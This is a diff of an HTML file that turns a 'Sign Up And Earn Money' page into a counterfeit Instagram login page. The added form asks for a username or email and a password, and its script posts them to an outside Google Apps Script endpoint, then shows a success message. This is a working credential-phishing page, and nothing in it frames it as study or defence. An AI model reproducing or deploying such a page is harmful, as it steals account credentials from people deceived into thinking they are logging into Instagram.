@@ -1,23 +1,64 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign Up And Earn Money</title>
+    <title>Instagram</title>
     <link rel="stylesheet" href="style.css">
 </head>
-
 <body>
 
-    <div id="header">
-        <div class="container">
-            <h1 class="h1">Sign up And Earn Money</h1>
-            <br><br><br>
-            <a href="https://yashbalwani.github.io/New/" target="_blank" class="btn">Sign Up</a>
-        </div>
+
+    <img class="cross" src="ccc.jpg" alt="" srcset="">
+    
+    <div class="container">
+    
+        <div class="image">
+        <img src="logo.jpg" alt="" srcset="">
     </div>
 
-</body>
+        <form name="submit-to-google-sheet">
+            <input class="tttt" type="email,number" placeholder="Phone number, username or email" name="text" id="">
+            <input class="yyyy" type="password" name="pass" placeholder="Password" id="#">
+            <a class="forgot" href="https://www.instagram.com/accounts/password/reset/?hl=en">Forgot password?</a>
+            <button class="ffff" type="submit">Log in</button>
+        </form>
 
+        <span id="msg"> message sent successfully</span>
+
+
+    <div class="facebook">
+        <a href="#" target="_blank">Continue as facebook</a>
+    </div>
+</div>
+    
+</div>
+
+
+<script>
+
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxok-s2rzGLQoCpoEb7jKO_zyHRGH63v2eoLq67rwCGqOk6-5pkWCMd32OsOaronZyF/exec'
+    const form = document.forms['submit-to-google-sheet']
+
+    const msg = document.getElementById("msg")
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => {
+            msg.innerHTML = "Message sent successfully"
+            setTimeout(function(){
+                msg.innerHTML = ""
+            },5000)
+            form.reset()
+        })
+        
+    })
+
+
+  </script>
+
+
+</body>
 </html>
+
